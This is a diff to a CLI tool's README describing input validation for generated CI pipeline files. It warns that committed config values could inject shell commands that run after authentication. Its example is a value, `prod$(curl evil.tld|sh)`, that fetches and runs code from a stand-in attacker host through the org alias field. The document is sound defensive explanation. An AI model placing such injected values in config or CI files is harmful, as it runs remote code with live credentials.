@@ -1223,6 +1223,18 @@ sfdt scratch delete feature-x --yes
 
 Generate a ready-to-use CI pipeline. `sfdt ci init` interpolates the cron schedule, org alias, Node version, and delta base into a provider-specific template. For GitHub it writes into `.github/workflows/`; other providers emit a standalone fragment under `.sfdt/ci/`.
 
+> **Interpolated values are validated before anything is written.** The org alias, branch, delta
+> base, environment, definition-file path, Node version and cron expression land inside shell
+> commands in the generated file, and several of them default from `.sfdt/config.json` — which is
+> committed, so it arrives with whatever repository was cloned. Each is restricted to a character
+> set appropriate to what it is (an alias, a git ref, a path…), and a value outside it aborts
+> generation with a message naming the key and where to fix it. Nothing is written on failure.
+>
+> This matters because the blast radius is not local: the generated file is committed and pushed,
+> then runs in CI **after** the auth step with your org credentials live in the job. A
+> `defaultOrg` of `prod$(curl evil.tld|sh)` would otherwise have become
+> `--org prod$(curl evil.tld|sh)` in a `run:` line.
+
 ```bash
 sfdt ci init --provider github --type monitor
 sfdt ci init --provider gitlab --type deploy
